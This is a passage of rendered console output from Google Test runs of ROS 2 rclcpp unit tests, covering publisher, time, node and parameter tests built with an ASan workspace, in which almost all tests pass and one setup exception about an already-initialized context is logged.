    <span id="cb150-133"><a href="#cb150-133" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestWithDifferentNodeOptions/TestSubscriptionPublisherCount.increasing_and_decreasing_counts/two_contexts_test</span> <span class="er">(</span><span class="ex">8294</span> ms<span class="kw">)</span></span>
    <span id="cb150-134"><a href="#cb150-134" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestWithDifferentNodeOptions/TestSubscriptionPublisherCount <span class="er">(</span><span class="ex">16499</span> ms total<span class="kw">)</span></span>
    <span id="cb150-135"><a href="#cb150-135" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-136"><a href="#cb150-136" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-137"><a href="#cb150-137" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 2 tests from 1 test case ran. <span class="er">(</span><span class="ex">16502</span> ms total<span class="kw">)</span></span>
    <span id="cb150-138"><a href="#cb150-138" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">2</span> tests.</span>
    <span id="cb150-139"><a href="#cb150-139" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-140"><a href="#cb150-140" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 6 tests from 3 test cases.</span>
    <span id="cb150-141"><a href="#cb150-141" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-142"><a href="#cb150-142" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestPublisher</span>
    <span id="cb150-143"><a href="#cb150-143" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestPublisher.construction_and_destruction</span></span>
    <span id="cb150-144"><a href="#cb150-144" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestPublisher.construction_and_destruction</span> <span class="er">(</span><span class="ex">74</span> ms<span class="kw">)</span></span>
    <span id="cb150-145"><a href="#cb150-145" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestPublisher.various_creation_signatures</span></span>
    <span id="cb150-146"><a href="#cb150-146" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestPublisher.various_creation_signatures</span> <span class="er">(</span><span class="ex">36</span> ms<span class="kw">)</span></span>
    <span id="cb150-147"><a href="#cb150-147" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 2 tests from TestPublisher <span class="er">(</span><span class="ex">110</span> ms total<span class="kw">)</span></span>
    <span id="cb150-148"><a href="#cb150-148" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-149"><a href="#cb150-149" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestPublisherSub</span>
    <span id="cb150-150"><a href="#cb150-150" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestPublisherSub.construction_and_destruction</span></span>
    <span id="cb150-151"><a href="#cb150-151" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestPublisherSub.construction_and_destruction</span> <span class="er">(</span><span class="ex">36</span> ms<span class="kw">)</span></span>
    <span id="cb150-152"><a href="#cb150-152" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 1 test from TestPublisherSub <span class="er">(</span><span class="ex">36</span> ms total<span class="kw">)</span></span>
    <span id="cb150-153"><a href="#cb150-153" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-154"><a href="#cb150-154" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 3 tests from TestPublisherThrows/TestPublisherInvalidIntraprocessQos</span>
    <span id="cb150-155"><a href="#cb150-155" aria-hidden="true" tabindex="-1"></a><span class="ex">unknown</span> file: Failure</span>
    <span id="cb150-156"><a href="#cb150-156" aria-hidden="true" tabindex="-1"></a><span class="ex">C++</span> exception with description <span class="st">&quot;context is already initialized&quot;</span> thrown in SetUpTestCase<span class="er">(</span><span class="kw">)</span><span class="bu">.</span></span>
    <span id="cb150-157"><a href="#cb150-157" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestPublisherThrows/TestPublisherInvalidIntraprocessQos.test_publisher_throws/transient_local_qos</span></span>
    <span id="cb150-158"><a href="#cb150-158" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestPublisherThrows/TestPublisherInvalidIntraprocessQos.test_publisher_throws/transient_local_qos</span> <span class="er">(</span><span class="ex">60</span> ms<span class="kw">)</span></span>
    <span id="cb150-159"><a href="#cb150-159" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestPublisherThrows/TestPublisherInvalidIntraprocessQos.test_publisher_throws/keep_last_qos_with_zero_history_depth</span></span>
    <span id="cb150-160"><a href="#cb150-160" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestPublisherThrows/TestPublisherInvalidIntraprocessQos.test_publisher_throws/keep_last_qos_with_zero_history_depth</span> <span class="er">(</span><span class="ex">49</span> ms<span class="kw">)</span></span>
    <span id="cb150-161"><a href="#cb150-161" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestPublisherThrows/TestPublisherInvalidIntraprocessQos.test_publisher_throws/keep_all_qos</span></span>
    <span id="cb150-162"><a href="#cb150-162" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestPublisherThrows/TestPublisherInvalidIntraprocessQos.test_publisher_throws/keep_all_qos</span> <span class="er">(</span><span class="ex">47</span> ms<span class="kw">)</span></span>
    <span id="cb150-163"><a href="#cb150-163" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 3 tests from TestPublisherThrows/TestPublisherInvalidIntraprocessQos <span class="er">(</span><span class="ex">158</span> ms total<span class="kw">)</span></span>
    <span id="cb150-164"><a href="#cb150-164" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-165"><a href="#cb150-165" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-166"><a href="#cb150-166" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 6 tests from 3 test cases ran. <span class="er">(</span><span class="ex">330</span> ms total<span class="kw">)</span></span>
    <span id="cb150-167"><a href="#cb150-167" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">6</span> tests.</span>
    <span id="cb150-168"><a href="#cb150-168" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-169"><a href="#cb150-169" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 7 tests from 1 test case.</span>
    <span id="cb150-170"><a href="#cb150-170" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-171"><a href="#cb150-171" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 7 tests from TestTime</span>
    <span id="cb150-172"><a href="#cb150-172" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTime.clock_type_access</span></span>
    <span id="cb150-173"><a href="#cb150-173" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTime.clock_type_access</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-174"><a href="#cb150-174" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTime.time_sources</span></span>
    <span id="cb150-175"><a href="#cb150-175" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTime.time_sources</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-176"><a href="#cb150-176" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTime.conversions</span></span>
    <span id="cb150-177"><a href="#cb150-177" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTime.conversions</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-178"><a href="#cb150-178" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTime.operators</span></span>
    <span id="cb150-179"><a href="#cb150-179" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTime.operators</span> <span class="er">(</span><span class="ex">1</span> ms<span class="kw">)</span></span>
    <span id="cb150-180"><a href="#cb150-180" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTime.overflow_detectors</span></span>
    <span id="cb150-181"><a href="#cb150-181" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTime.overflow_detectors</span> <span class="er">(</span><span class="ex">14</span> ms<span class="kw">)</span></span>
    <span id="cb150-182"><a href="#cb150-182" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTime.overflows</span></span>
    <span id="cb150-183"><a href="#cb150-183" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTime.overflows</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-184"><a href="#cb150-184" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestTime.seconds</span></span>
    <span id="cb150-185"><a href="#cb150-185" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestTime.seconds</span> <span class="er">(</span><span class="ex">0</span> ms<span class="kw">)</span></span>
    <span id="cb150-186"><a href="#cb150-186" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 7 tests from TestTime <span class="er">(</span><span class="ex">16</span> ms total<span class="kw">)</span></span>
    <span id="cb150-187"><a href="#cb150-187" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-188"><a href="#cb150-188" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-189"><a href="#cb150-189" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 7 tests from 1 test case ran. <span class="er">(</span><span class="ex">17</span> ms total<span class="kw">)</span></span>
    <span id="cb150-190"><a href="#cb150-190" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">7</span> tests.</span>
    <span id="cb150-191"><a href="#cb150-191" aria-hidden="true" tabindex="-1"></a><span class="ex">Running</span> main<span class="er">(</span><span class="kw">)</span> <span class="ex">from</span> /opt/ros2_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc</span>
    <span id="cb150-192"><a href="#cb150-192" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> Running 36 tests from 1 test case.</span>
    <span id="cb150-193"><a href="#cb150-193" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment set-up.</span>
    <span id="cb150-194"><a href="#cb150-194" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 36 tests from TestNode</span>
    <span id="cb150-195"><a href="#cb150-195" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.construction_and_destruction</span></span>
    <span id="cb150-196"><a href="#cb150-196" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.construction_and_destruction</span> <span class="er">(</span><span class="ex">74</span> ms<span class="kw">)</span></span>
    <span id="cb150-197"><a href="#cb150-197" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_name_and_namespace</span></span>
    <span id="cb150-198"><a href="#cb150-198" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_name_and_namespace</span> <span class="er">(</span><span class="ex">545</span> ms<span class="kw">)</span></span>
    <span id="cb150-199"><a href="#cb150-199" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.subnode_get_name_and_namespace</span></span>
    <span id="cb150-200"><a href="#cb150-200" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.subnode_get_name_and_namespace</span> <span class="er">(</span><span class="ex">273</span> ms<span class="kw">)</span></span>
    <span id="cb150-201"><a href="#cb150-201" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.subnode_construction_and_destruction</span></span>
    <span id="cb150-202"><a href="#cb150-202" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.subnode_construction_and_destruction</span> <span class="er">(</span><span class="ex">371</span> ms<span class="kw">)</span></span>
    <span id="cb150-203"><a href="#cb150-203" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_logger</span></span>
    <span id="cb150-204"><a href="#cb150-204" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_logger</span> <span class="er">(</span><span class="ex">238</span> ms<span class="kw">)</span></span>
    <span id="cb150-205"><a href="#cb150-205" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_clock</span></span>
    <span id="cb150-206"><a href="#cb150-206" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_clock</span> <span class="er">(</span><span class="ex">43</span> ms<span class="kw">)</span></span>
    <span id="cb150-207"><a href="#cb150-207" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.now</span></span>
    <span id="cb150-208"><a href="#cb150-208" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.now</span> <span class="er">(</span><span class="ex">39</span> ms<span class="kw">)</span></span>
    <span id="cb150-209"><a href="#cb150-209" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.declare_parameter_with_no_initial_values</span></span>
    <span id="cb150-210"><a href="#cb150-210" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.declare_parameter_with_no_initial_values</span> <span class="er">(</span><span class="ex">51</span> ms<span class="kw">)</span></span>
    <span id="cb150-211"><a href="#cb150-211" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.test_registering_multiple_callbacks_api</span></span>
    <span id="cb150-212"><a href="#cb150-212" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.test_registering_multiple_callbacks_api</span> <span class="er">(</span><span class="ex">43</span> ms<span class="kw">)</span></span>
    <span id="cb150-213"><a href="#cb150-213" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.declare_parameter_with_overrides</span></span>
    <span id="cb150-214"><a href="#cb150-214" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.declare_parameter_with_overrides</span> <span class="er">(</span><span class="ex">53</span> ms<span class="kw">)</span></span>
    <span id="cb150-215"><a href="#cb150-215" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.declare_parameters_with_no_initial_values</span></span>
    <span id="cb150-216"><a href="#cb150-216" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.declare_parameters_with_no_initial_values</span> <span class="er">(</span><span class="ex">49</span> ms<span class="kw">)</span></span>
    <span id="cb150-217"><a href="#cb150-217" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.undeclare_parameter</span></span>
    <span id="cb150-218"><a href="#cb150-218" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.undeclare_parameter</span> <span class="er">(</span><span class="ex">45</span> ms<span class="kw">)</span></span>
    <span id="cb150-219"><a href="#cb150-219" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.has_parameter</span></span>
    <span id="cb150-220"><a href="#cb150-220" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.has_parameter</span> <span class="er">(</span><span class="ex">44</span> ms<span class="kw">)</span></span>
    <span id="cb150-221"><a href="#cb150-221" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_parameter_undeclared_parameters_not_allowed</span></span>
    <span id="cb150-222"><a href="#cb150-222" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_parameter_undeclared_parameters_not_allowed</span> <span class="er">(</span><span class="ex">72</span> ms<span class="kw">)</span></span>
    <span id="cb150-223"><a href="#cb150-223" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_parameter_undeclared_parameters_allowed</span></span>
    <span id="cb150-224"><a href="#cb150-224" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_parameter_undeclared_parameters_allowed</span> <span class="er">(</span><span class="ex">44</span> ms<span class="kw">)</span></span>
    <span id="cb150-225"><a href="#cb150-225" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_parameters_undeclared_parameters_not_allowed</span></span>
    <span id="cb150-226"><a href="#cb150-226" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_parameters_undeclared_parameters_not_allowed</span> <span class="er">(</span><span class="ex">54</span> ms<span class="kw">)</span></span>
    <span id="cb150-227"><a href="#cb150-227" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_parameters_undeclared_parameters_allowed</span></span>
    <span id="cb150-228"><a href="#cb150-228" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_parameters_undeclared_parameters_allowed</span> <span class="er">(</span><span class="ex">44</span> ms<span class="kw">)</span></span>
    <span id="cb150-229"><a href="#cb150-229" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_parameters_atomically_undeclared_parameters_not_allowed</span></span>
    <span id="cb150-230"><a href="#cb150-230" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_parameters_atomically_undeclared_parameters_not_allowed</span> <span class="er">(</span><span class="ex">52</span> ms<span class="kw">)</span></span>
    <span id="cb150-231"><a href="#cb150-231" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_parameters_atomically_undeclared_parameters_allowed</span></span>
    <span id="cb150-232"><a href="#cb150-232" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_parameters_atomically_undeclared_parameters_allowed</span> <span class="er">(</span><span class="ex">45</span> ms<span class="kw">)</span></span>
    <span id="cb150-233"><a href="#cb150-233" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_parameter_undeclared_parameters_not_allowed</span></span>
    <span id="cb150-234"><a href="#cb150-234" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_parameter_undeclared_parameters_not_allowed</span> <span class="er">(</span><span class="ex">47</span> ms<span class="kw">)</span></span>
    <span id="cb150-235"><a href="#cb150-235" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_parameter_undeclared_parameters_allowed</span></span>
    <span id="cb150-236"><a href="#cb150-236" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_parameter_undeclared_parameters_allowed</span> <span class="er">(</span><span class="ex">46</span> ms<span class="kw">)</span></span>
    <span id="cb150-237"><a href="#cb150-237" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_parameter_or_undeclared_parameters_not_allowed</span></span>
    <span id="cb150-238"><a href="#cb150-238" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_parameter_or_undeclared_parameters_not_allowed</span> <span class="er">(</span><span class="ex">45</span> ms<span class="kw">)</span></span>
    <span id="cb150-239"><a href="#cb150-239" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_parameter_or_undeclared_parameters_allowed</span></span>
    <span id="cb150-240"><a href="#cb150-240" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_parameter_or_undeclared_parameters_allowed</span> <span class="er">(</span><span class="ex">25</span> ms<span class="kw">)</span></span>
    <span id="cb150-241"><a href="#cb150-241" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_parameters_undeclared_parameters_not_allowed</span></span>
    <span id="cb150-242"><a href="#cb150-242" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_parameters_undeclared_parameters_not_allowed</span> <span class="er">(</span><span class="ex">65</span> ms<span class="kw">)</span></span>
    <span id="cb150-243"><a href="#cb150-243" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_parameters_undeclared_parameters_allowed</span></span>
    <span id="cb150-244"><a href="#cb150-244" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_parameters_undeclared_parameters_allowed</span> <span class="er">(</span><span class="ex">30</span> ms<span class="kw">)</span></span>
    <span id="cb150-245"><a href="#cb150-245" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.describe_parameter_undeclared_parameters_not_allowed</span></span>
    <span id="cb150-246"><a href="#cb150-246" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.describe_parameter_undeclared_parameters_not_allowed</span> <span class="er">(</span><span class="ex">37</span> ms<span class="kw">)</span></span>
    <span id="cb150-247"><a href="#cb150-247" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.describe_parameter_undeclared_parameters_allowed</span></span>
    <span id="cb150-248"><a href="#cb150-248" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.describe_parameter_undeclared_parameters_allowed</span> <span class="er">(</span><span class="ex">27</span> ms<span class="kw">)</span></span>
    <span id="cb150-249"><a href="#cb150-249" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.describe_parameters_undeclared_parameters_not_allowed</span></span>
    <span id="cb150-250"><a href="#cb150-250" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.describe_parameters_undeclared_parameters_not_allowed</span> <span class="er">(</span><span class="ex">28</span> ms<span class="kw">)</span></span>
    <span id="cb150-251"><a href="#cb150-251" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.describe_parameters_undeclared_parameters_allowed</span></span>
    <span id="cb150-252"><a href="#cb150-252" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.describe_parameters_undeclared_parameters_allowed</span> <span class="er">(</span><span class="ex">29</span> ms<span class="kw">)</span></span>
    <span id="cb150-253"><a href="#cb150-253" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_parameter_types_undeclared_parameters_not_allowed</span></span>
    <span id="cb150-254"><a href="#cb150-254" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_parameter_types_undeclared_parameters_not_allowed</span> <span class="er">(</span><span class="ex">26</span> ms<span class="kw">)</span></span>
    <span id="cb150-255"><a href="#cb150-255" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.get_parameter_types_undeclared_parameters_allowed</span></span>
    <span id="cb150-256"><a href="#cb150-256" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.get_parameter_types_undeclared_parameters_allowed</span> <span class="er">(</span><span class="ex">30</span> ms<span class="kw">)</span></span>
    <span id="cb150-257"><a href="#cb150-257" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_on_parameters_set_callback_get_parameter</span></span>
    <span id="cb150-258"><a href="#cb150-258" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_on_parameters_set_callback_get_parameter</span> <span class="er">(</span><span class="ex">32</span> ms<span class="kw">)</span></span>
    <span id="cb150-259"><a href="#cb150-259" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_on_parameters_set_callback_set_parameter</span></span>
    <span id="cb150-260"><a href="#cb150-260" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_on_parameters_set_callback_set_parameter</span> <span class="er">(</span><span class="ex">26</span> ms<span class="kw">)</span></span>
    <span id="cb150-261"><a href="#cb150-261" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_on_parameters_set_callback_declare_parameter</span></span>
    <span id="cb150-262"><a href="#cb150-262" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_on_parameters_set_callback_declare_parameter</span> <span class="er">(</span><span class="ex">28</span> ms<span class="kw">)</span></span>
    <span id="cb150-263"><a href="#cb150-263" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_on_parameters_set_callback_undeclare_parameter</span></span>
    <span id="cb150-264"><a href="#cb150-264" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_on_parameters_set_callback_undeclare_parameter</span> <span class="er">(</span><span class="ex">26</span> ms<span class="kw">)</span></span>
    <span id="cb150-265"><a href="#cb150-265" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> RUN      <span class="bu">]</span> <span class="ex">TestNode.set_on_parameters_set_callback_set_on_parameters_set_callback</span></span>
    <span id="cb150-266"><a href="#cb150-266" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>       OK <span class="bu">]</span> <span class="ex">TestNode.set_on_parameters_set_callback_set_on_parameters_set_callback</span> <span class="er">(</span><span class="ex">35</span> ms<span class="kw">)</span></span>
    <span id="cb150-267"><a href="#cb150-267" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> 36 tests from TestNode <span class="er">(</span><span class="ex">2766</span> ms total<span class="kw">)</span></span>
    <span id="cb150-268"><a href="#cb150-268" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb150-269"><a href="#cb150-269" aria-hidden="true" tabindex="-1"></a><span class="ex">[----------]</span> Global test environment tear-down</span>
    <span id="cb150-270"><a href="#cb150-270" aria-hidden="true" tabindex="-1"></a><span class="ex">[==========]</span> 36 tests from 1 test case ran. <span class="er">(</span><span class="ex">2790</span> ms total<span class="kw">)</span></span>
    <span id="cb150-271"><a href="#cb150-271" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>  PASSED  <span class="bu">]</span> <span class="ex">36</span> tests.</span>
